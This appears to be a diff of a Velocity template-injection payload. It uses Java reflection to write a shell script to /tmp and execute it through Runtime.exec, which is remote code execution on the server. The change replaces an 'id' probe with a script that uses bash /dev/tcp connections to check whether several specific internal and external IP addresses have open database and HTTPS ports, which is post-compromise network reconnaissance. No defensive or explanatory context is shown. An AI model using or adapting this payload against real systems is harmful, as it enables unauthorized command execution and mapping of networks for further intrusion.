@@ -1,6 +1,6 @@
 #set($x = "")
 #set($fw = $x.getClass().forName("java.io.FileWriter").getConstructor($x.getClass().forName("java.lang.String")).newInstance("/tmp/zz_cmd.sh"))
-$fw.write("id; echo READY")
+$fw.write("echo ===HZBXHD; timeout 3 bash -c '</dev/tcp/192.168.3.10/40785' && echo OMNI_DB_OPEN || echo OMNI_DB_CLOSED; timeout 3 bash -c '</dev/tcp/10.66.1.50/30385' && echo HZCS_DB_OPEN || echo HZCS_DB_CLOSED; timeout 3 bash -c '</dev/tcp/192.168.6.41/3306' && echo Z641_OPEN || echo Z641_CLOSED; timeout 3 bash -c '</dev/tcp/121.199.65.103/443' && echo SILO_OPEN || echo SILO_CLOSED; timeout 3 bash -c '</dev/tcp/47.98.122.163/443' && echo BXYSH_OPEN || echo BXYSH_CLOSED; timeout 3 bash -c '</dev/tcp/47.97.216.38/443' && echo OMNIGW_OPEN || echo OMNIGW_CLOSED; echo NET_DONE")
 $fw.close()
 #set($rt = $x.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null))
 #set($p = $rt.exec("/bin/bash /tmp/zz_cmd.sh"))
